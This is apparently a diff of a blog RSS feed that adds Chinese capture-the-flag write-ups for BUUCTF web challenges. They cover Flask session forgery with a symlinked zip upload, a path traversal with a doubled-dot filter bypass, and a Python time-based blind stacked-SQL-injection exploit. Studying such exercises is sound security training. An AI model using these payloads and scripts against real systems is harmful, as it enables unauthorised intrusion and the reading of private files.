punctuation&#34;&gt;:&lt;/span&gt; payload&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token comment&#34;&gt;# print(datas)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; start_time&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;time&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;time&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; res &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; requests&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;post&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;url&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;url&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;json&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;datas&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; end_time&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;time&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;time&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; spend_time&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;end_time&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;start_time&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; spend_time&lt;span class=&#34;token operator&#34;&gt;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0.19&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; low &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; mid&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; high &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; mid&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; mid &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;low&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;high&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;mid &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;32&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;or&lt;/span&gt; mid &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;127&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token keyword&#34;&gt;break&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;flag &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; flag&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;mid&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;flag&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;\n&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;bytes&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;fromhex&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;flag&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;decode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;utf-8&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt; ]]></description>
         </item>
         <item>
             <guid isPermalink="true">http://odiws.github.io/2025/02/23/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-SimpleRCE/</guid>
@@ -2166,6 +2219,124 @@ echo serialize($a);
  ]]></description>
         </item>
         <item>
+            <guid isPermalink="true">http://odiws.github.io/2024/10/15/SWPU2019-Web3/</guid>
+            <title>[SWPU2019]Web3</title>
+            <link>http://odiws.github.io/2024/10/15/SWPU2019-Web3/</link>
+            <category>buuctf</category>
+            <category>flask的session伪造</category>
+            <pubDate>Tue, 15 Oct 2024 16:32:39 +0800</pubDate>
+            <description><![CDATA[ &lt;h2 id=&#34;swpu2019web3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#swpu2019web3&#34;&gt;#&lt;/a&gt; [SWPU2019]Web3&lt;/h2&gt;
+&lt;p&gt;F12 发现可疑 session：&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/web3/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
+&lt;p&gt;用一些解密 session 的脚本运行：（flask-unsign（无需密钥），flask_session_cookie_manager (需要密钥)）&lt;/p&gt;
+&lt;p&gt;得到：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;#123;&#39;id&#39;: b&#39;100&#39;, &#39;is_login&#39;: True, &#39;password&#39;: &#39;admin&#39;, &#39;username&#39;: &#39;admin&#39;&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;怀疑是 id 的原因，不能 upload（可以怀疑是 linux 的 uid，将其改成 1）&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;#123;&#39;id&#39;: b&#39;1&#39;, &#39;is_login&#39;: True, &#39;password&#39;: &#39;admin&#39;, &#39;username&#39;: &#39;admin&#39;&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;ctrl+u 发现访问不存在的目录有东西，访问后有个 base64 解码&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;secretkey：keyqqqwwweee!@#$%^&amp;amp;*
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;加密&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#加密&#34;&gt;#&lt;/a&gt; 加密：&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&#34;language-pyhton&#34;&gt;python flask_session_cookie_manager3.py encode -s &amp;quot;keyqqqwwweee!@#$%^&amp;amp;*&amp;quot; -t &amp;quot;&amp;#123;&#39;id&#39;: b&#39;1&#39;, &#39;is_login&#39;: True, &#39;password&#39;: &#39;admin&#39;, &#39;usern
+ame&#39;: &#39;admin&#39;&amp;#125;&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;注意必须是双引号&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#注意必须是双引号&#34;&gt;#&lt;/a&gt; 注意：必须是双引号&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;.eJyrVspMUbKqVlJIUrJS8g20tVWq1VHKLI7PyU_PzFOyKikqTdVRKkgsLi7PLwIqVEpMyQWK6yiVFqcW5SXmpsKFagFiyxgX.Zw4qow.vmpZTSGoPFjEWa3pCDPZiEykuks
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;修改后源代码里面有源码：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;@app.route(&#39;/upload&#39;,methods=[&#39;GET&#39;,&#39;POST&#39;])
+def upload():
+    if session[&#39;id&#39;] != b&#39;1&#39;:
+        return render_template_string(temp)
+    if request.method==&#39;POST&#39;:
+        m = hashlib.md5()
+        name = session[&#39;password&#39;]
+        name = name+&#39;qweqweqwe&#39;
+        name = name.encode(encoding=&#39;utf-8&#39;)
+        m.update(name)
+        md5_one= m.hexdigest()
+        n = hashlib.md5()
+        ip = request.remote_addr
+        ip = ip.encode(encoding=&#39;utf-8&#39;)
+        n.update(ip)
+        md5_ip = n.hexdigest()
+        f=request.files[&#39;file&#39;]
+        basepath=os.path.dirname(os.path.realpath(__file__))
+        path = basepath+&#39;/upload/&#39;+md5_ip+&#39;/&#39;+md5_one+&#39;/&#39;+session[&#39;username&#39;]+&amp;quot;/&amp;quot;
+        path_base = basepath+&#39;/upload/&#39;+md5_ip+&#39;/&#39;
+        filename = f.filename
+        pathname = path+filename
+        if &amp;quot;zip&amp;quot; != filename.split(&#39;.&#39;)[-1]:
+            return &#39;zip only allowed&#39;
+        if not os.path.exists(path_base):
+            try:
+                os.makedirs(path_base)
+            except Exception as e:
+                return &#39;error&#39;
+        if not os.path.exists(path):
+            try:
+                os.makedirs(path)
+            except Exception as e:
+                return &#39;error&#39;
+        if not os.path.exists(pathname):
+            try:
+                f.save(pathname)
+            except Exception as e:
+                return &#39;error&#39;
+        try:
+            cmd = &amp;quot;unzip -n -d &amp;quot;+path+&amp;quot; &amp;quot;+ pathname
+            if cmd.find(&#39;|&#39;) != -1 or cmd.find(&#39;;&#39;) != -1:
+				waf()
+                return &#39;error&#39;
+            os.system(cmd)
+        except Exception as e:
+            return &#39;error&#39;
+        unzip_file = zipfile.ZipFile(pathname,&#39;r&#39;)
+        unzip_filename = unzip_file.namelist()[0]
+        if session[&#39;is_login&#39;] != True:
+            return &#39;not login&#39;
+        try:
+            if unzip_filename.find(&#39;/&#39;) != -1:
+                shutil.rmtree(path_base)
+                os.mkdir(path_base)
+                return &#39;error&#39;
+            image = open(path+unzip_filename, &amp;quot;rb&amp;quot;).read()
+            resp = make_response(image)
+            resp.headers[&#39;Content-Type&#39;] = &#39;image/png&#39;
+            return resp
+        except Exception as e:
+            shutil.rmtree(path_base)
+            os.mkdir(path_base)
+            return &#39;error&#39;
+    return render_template(&#39;upload.html&#39;)
+
+
+@app.route(&#39;/showflag&#39;)
+def showflag():
+    if True == False:
+        image = open(os.path.join(&#39;./flag/flag.jpg&#39;), &amp;quot;rb&amp;quot;).read()
+        resp = make_response(image)
+        resp.headers[&#39;Content-Type&#39;] = &#39;image/png&#39;
+        return resp
+    else:
+        return &amp;quot;can&#39;t give you&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;定义两个路由，上传的那个路由就是上传一个压缩的图片，服务器进行解压再显示图片，我们这里可上传一个软连接压缩包，来读取其他文件，showflag 路由告诉我们 flag.jpg 放在 flask 根目录的 flag 目录下&lt;/p&gt;
+&lt;p&gt;构造 payload&lt;/p&gt;
+&lt;p&gt;ln -s 是 Linux 的一种软连接，类似与 windows 的快捷方式&lt;br&gt;
+ ln -s /etc/passwd forever404 这会出现一个 forever404 文本，里面包含密码&lt;br&gt;
+ /proc/self 记录了系统运行的信息状态等，cwd 指向当前进程运行目录的一个符号链接，即 flask 运行进程目录&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;ln -s /proc/self/cwd/flag/flag.jpg test
+zip -ry test.zip test
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/web3/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
+&lt;p&gt;将该文件上传获取 flag：&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/web3/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
             <guid isPermalink="true">http://odiws.github.io/2024/10/15/PwnThyBytes%E2%80%94%E2%80%942019-Baby-SQL/</guid>
             <title>[PwnThyBytes——2019]Baby_SQL</title>
             <link>http://odiws.github.io/2024/10/15/PwnThyBytes%E2%80%94%E2%80%942019-Baby-SQL/</link>
@@ -2389,6 +2560,39 @@ for($k=1;$k&amp;lt;=sizeof($payload);$k++)&amp;#123;
 &amp;#125;
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;参考链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZteXl5MS9hcnRpY2xlL2RldGFpbHMvMTE3MDkwMDAx&#34;&gt;https://blog.csdn.net/fmyyy1/article/details/117090001&lt;/span&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">http://odiws.github.io/2024/09/24/virink-2019-files-share/</guid>
+            <title>virink_2019_files_share</title>
+            <link>http://odiws.github.io/2024/09/24/virink-2019-files-share/</link>
+            <category>buuctf</category>
+            <category>任意文件读取</category>
+            <pubDate>Tue, 24 Sep 2024 19:14:53 +0800</pubDate>
+            <description><![CDATA[ &lt;h2 id=&#34;virink_2019_files_share&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#virink_2019_files_share&#34;&gt;#&lt;/a&gt; virink_2019_files_share&lt;/h2&gt;
+&lt;h2 id=&#34;4&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4&#34;&gt;#&lt;/a&gt; &lt;img data-src=&#34;../images/%5B%E7%BE%8A%E5%9F%8E%E6%9D%AF2020%5DEasyphp2/4.png&#34; alt=&#34;4&#34;&gt;&lt;/h2&gt;
+&lt;p&gt;进来就是 js 小游戏，没有什么提示说还原后才给 flag，所以可以直接信息搜集&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;head&amp;gt;
+	&amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt;
+	&amp;lt;title&amp;gt;The Cube&amp;lt;/title&amp;gt;
+	&amp;lt;meta name=&amp;quot;viewport&amp;quot;
+		content=&amp;quot;width=device-width,height=device-height,user-scalable=no,initial-scale=1.0,maximum-scale=1.0,minimum-scale=1.0&amp;quot;&amp;gt;
+	&amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;/static/style.css&amp;quot;&amp;gt;
+	&amp;lt;link rel=&amp;quot;icon&amp;quot; href=&amp;quot;/uploads/favicon.ico&amp;quot; type=&amp;quot;image/x-icon&amp;quot; /&amp;gt;
+	&amp;lt;!-- Hint : flag in f1ag_Is_h3re --&amp;gt;
+	&amp;lt;!-- 趣味题，真的是为了出题而出题的，别打我。 By Virink --&amp;gt;
+&amp;lt;/head&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;发现提示进去看看。&lt;img data-src=&#34;../images/%5B%E7%BE%8A%E5%9F%8E%E6%9D%AF2020%5DEasyphp2/5.png&#34; alt=&#34;5&#34;&gt;&lt;/p&gt;
+&lt;p&gt;任意文件读取（双写绕过过滤）：由于是使用 OpenResty，尝试包含 nginx 的配置文件，默认是 /etc/nginx/conf.d/default.conf&lt;br&gt;
+ 尝试访问后发现过滤了…/, 所以使用双写绕过&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;/preview?f=....//....//....//....//....//....//....//etc..//nginx..//conf.d..//default.conf
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;然后根据提示访问 flag 文件&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;/preview?f=....//....//....//....//....//....//....//f1ag_Is_h3re..//flag
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5B%E7%BE%8A%E5%9F%8E%E6%9D%AF2020%5DEasyphp2/6.png&#34; alt=&#34;6&#34;&gt; 参考链接：&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MjYzOTUxL2FydGljbGUvZGV0YWlscy8xMTk1OTkzNjg=&#34;&gt;https://blog.csdn.net/qq_46263951/article/details/119599368&lt;/span&gt;&lt;/p&gt;
  ]]></description>
         </item>
         <item>
@@ -2718,6 +2922,131 @@ flag = requests.get(url, cookies=cookie)
 print(flag.text)
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;参考链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NoaW55Z29kL2FydGljbGUvZGV0YWlscy8xMjc2ODM1Nzc=&#34;&gt;https://blog.csdn.net/shinygod/article/details/127683577&lt;/span&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">http://odiws.github.io/2024/09/06/SWPU2019-Web4/</guid>
+            <title>[SWPU2019]Web4</title>
+            <link>http://odiws.github.io/2024/09/06/SWPU2019-Web4/</link>
+            <category>buuctf</category>
+            <category>PDO堆叠注入</category>
+            <pubDate>Fri, 06 Sep 2024 14:29:46 +0800</pubDate>
+            <description><![CDATA[ &lt;h2 id=&#34;swpu2019web4&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#swpu2019web4&#34;&gt;#&lt;/a&gt; [SWPU2019]Web4&lt;/h2&gt;
+&lt;p&gt;考点：PDO 场景下的堆叠注入、时间盲注&lt;/p&gt;
+&lt;p&gt;打开题目叫你登录，不过任凭你怎么登录都会没有反应，注册说 “未开放注册功能”&lt;/p&gt;
+&lt;p&gt;回头一抓包，发现我们向  &lt;code&gt;/index.php?r=Login/Login&lt;/code&gt;  发送了一个数据包，这里可以注入，POST 输入：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;#123;&amp;quot;username&amp;quot;:&amp;quot;1&#39;&amp;quot;,&amp;quot;password&amp;quot;:&amp;quot;123&amp;quot;&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;页面会报错，但是我们输入：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;#123;&amp;quot;username&amp;quot;:&amp;quot;1&#39;;&amp;quot;,&amp;quot;password&amp;quot;:&amp;quot;123&amp;quot;&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;页面却没报错，同时说密码错误；&lt;/p&gt;
+&lt;p&gt;那么说明这道题可以堆叠注入。&lt;/p&gt;
+&lt;p&gt;尝试  &lt;code&gt;1&#39;;show databases;&lt;/code&gt;  之类的操作，一直显示密码错误，猜测可能关键字被 waf 了，因为是堆叠，我们可以参考新春战疫的一道堆叠注入（当时也是 PDO），使用预编译 + 16 进制编码绕过 waf。&lt;/p&gt;
+&lt;p&gt;而且页面不会根据我们输入情况回显不同，那么就用时间盲注；&lt;/p&gt;
+&lt;p&gt;exp：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# by wh1sper
+# 时间盲注
+import requests
+import time
+ 
+host = &#39;http://fe683617-4ef1-4c6a-8332-febe7058c07e.node3.buuoj.cn/index.php?r=Login/Login&#39;
+ 
+ 
+def mid(bot, top):
+    return (int)(0.5 * (top + bot))
+ 
+def char_to_hex(str):
+    res = &#39;&#39;
+    for i in str:
+        res += hex(ord(i))
+    res = &#39;0x&#39; + res.replace(&#39;0x&#39;, &#39;&#39;)
+    return res
+ 
+ 
+def sqli():
+    name = &#39;&#39;
+    for j in range(1, 250):
+        top = 126
+        bot = 32
+        while 1:
+            #babyselect = &#39;database()&#39;#---&amp;gt;ctf
+            #babyselect = &#39;(select group_concat(table_name) &#39; \
+            #             &#39;from information_schema.tables where table_schema=database())&#39;#---flag
+            # babyselect = &#39;(select group_concat(column_name) &#39; \
+            #             &#39;from information_schema.columns where table_name=&#39;flag&#39;)&#39;#---&amp;gt;flag
+            babyselect = &#39;(select flag from flag)&#39;#---&amp;gt;glzjin_wants_a_girl_friend.zip
+            select = &amp;quot;select if((ascii(substr(&amp;quot; +babyselect+ &amp;quot;,&amp;#123;&amp;#125;,1))&amp;gt; &amp;#123;&amp;#125;),sleep(3),1);&amp;quot;\
+                .format(j, mid(bot, top))
+            playload = &amp;quot;1&#39;;set @a=&amp;quot;+ char_to_hex(select) +&amp;quot;;PREPARE test from @a;execute test;&amp;quot;
+ 
+            data = &amp;#123;
+                &amp;quot;username&amp;quot;: playload,
+                &amp;quot;password&amp;quot;: &amp;quot;1&amp;quot;
+            &amp;#125;
+            print(mid(bot, top))
+            start_time = time.time()
+            r = requests.post(url=host, json=data)
+            end_tmie = time.time()
+            #print(r.text)
+            if end_tmie - start_time &amp;gt; 1.5:  # 成功
+                if top - 1 == bot:  # top和bot相邻，说明name是top
+                    name += chr(top)
+                    print(name)
+                    break
+                bot = mid(bot, top)  # 成功就上移bot
+            else:  # 失败
+                if top - 1 == bot:  # top和bot相邻，加上失败，说明name是bot
+                    name += chr(bot)
+                    print(name)
+                    break
+                top = mid(bot, top)  # 失败就下移top
+ 
+ 
+if __name__ == &#39;__main__&#39;:
+    sqli()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;得到：glzjin_wants_a_girl_friend.zip&lt;/p&gt;
+&lt;p&gt;然后看的出来是个文件，访问下载之，得到网站源码。 很明显，我们要通过某种方法将 flag.php 中的文件内容给读取出来。&lt;/p&gt;
+&lt;p&gt;这是个 MVC 模型，首先了解一下该框架下 url 的解析过程：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;从 r 参数中获取要访问的  &lt;code&gt;Controller&lt;/code&gt;  以及  &lt;code&gt;Action&lt;/code&gt;  , 然后以  &lt;code&gt;/&lt;/code&gt;  分隔开后拼接成完整的控制器名。 以  &lt;code&gt;Login/Index&lt;/code&gt;  为例，就是将  &lt;code&gt;Login/Index&lt;/code&gt;  分隔开分别拼接成  &lt;code&gt;LoginController&lt;/code&gt;  以及  &lt;code&gt;actionIndex&lt;/code&gt;  , 然后调用  &lt;code&gt;LoginController&lt;/code&gt;  这个类中的  &lt;code&gt;actionIndex&lt;/code&gt;  方法。每个  &lt;code&gt;action&lt;/code&gt;  里面会调用对应的  &lt;code&gt;loadView()&lt;/code&gt;  方法进行模版渲染，然后将页面返回给客户端。 若访问的  &lt;code&gt;Controller&lt;/code&gt;  不存在则默认解析  &lt;code&gt;Login/Index&lt;/code&gt;  。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;这样我们就应该先来审计控制器的代码。&lt;/p&gt;
+&lt;p&gt;不难发现，在 BaseController 中有着这么一段明显有问题的代码&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;public function loadView($viewName =&#39;&#39;, $viewData = [])
+&amp;#123;
+    $this-&amp;gt;viewPath = BASE_PATH . &amp;quot;/View/&amp;#123;$viewName&amp;#125;.php&amp;quot;;
+    if(file_exists($this-&amp;gt;viewPath))
+    &amp;#123;
+        extract($viewData);
+        include $this-&amp;gt;viewPath;
+    &amp;#125;
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这段代码中使用了  &lt;code&gt;extract()&lt;/code&gt;  ，以及包含了  &lt;code&gt;/View/&amp;#123;$viewName&amp;#125;.php&lt;/code&gt;  ，也就是说我们能通过  &lt;code&gt;$viewName&lt;/code&gt;  和  &lt;code&gt;$viewData&lt;/code&gt;  这两个变量来更改  &lt;code&gt;/View&lt;/code&gt;  下任何一个 php 文件的任何一个变量的值。&lt;/p&gt;
+&lt;p&gt;在 UserController 中找到了以下代码:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;public function actionIndex()
+&amp;#123;
+    $listData = $_REQUEST;
+    $this-&amp;gt;loadView(&#39;userIndex&#39;,$listData);
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;可以看出来，其中  &lt;code&gt;$listData&lt;/code&gt;  是从请求中获取，用户可控，而其对应的  &lt;code&gt;/View/userIndex.php&lt;/code&gt;  中存在一个文件读取：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;div class=&amp;quot;fakeimg&amp;quot;&amp;gt;&amp;lt;?php
+    if(!isset($img_file)) &amp;#123;
+        $img_file = &#39;/../favicon.ico&#39;;
+    &amp;#125;
+    $img_dir = dirname(__FILE__) . $img_file;
+    $img_base64 = imgToBase64($img_dir);
+    echo &#39;&amp;lt;img src=&amp;quot;&#39; . $img_base64 . &#39;&amp;quot;&amp;gt;&#39;;       //图片形式展示
+    ?&amp;gt;&amp;lt;/div&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;其中  &lt;code&gt;imgToBase64()&lt;/code&gt;  实现的是将目标文件转化成 base64 格式。而我们只需要将  &lt;code&gt;$img_file&lt;/code&gt;  改成  &lt;code&gt;/flag.php&lt;/code&gt;  即可。&lt;/p&gt;
+&lt;p&gt;访问  &lt;code&gt;http://ip/index.php?r=User/Index&amp;amp;img_file=/../flag.php&lt;/code&gt;  即可获得 flag 的 base64&lt;/p&gt;
+&lt;p 51ca227a-c6d5-4515-bed7-abdea8385e8a=&#34;&#34;&gt;flag&lt;/p&gt;
+&lt;p&gt;参考链接：&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLndoMXNwZXIuY29tL3Bvc3RzL3N3cHUyMDE5LSVFNSVBNCU4RCVFNyU4RSVCMC8=&#34;&gt;https://blog.wh1sper.com/posts/swpu2019 - 复现 /&lt;/span&gt;&lt;/p&gt;
  ]]></description>
         </item>
         <item>
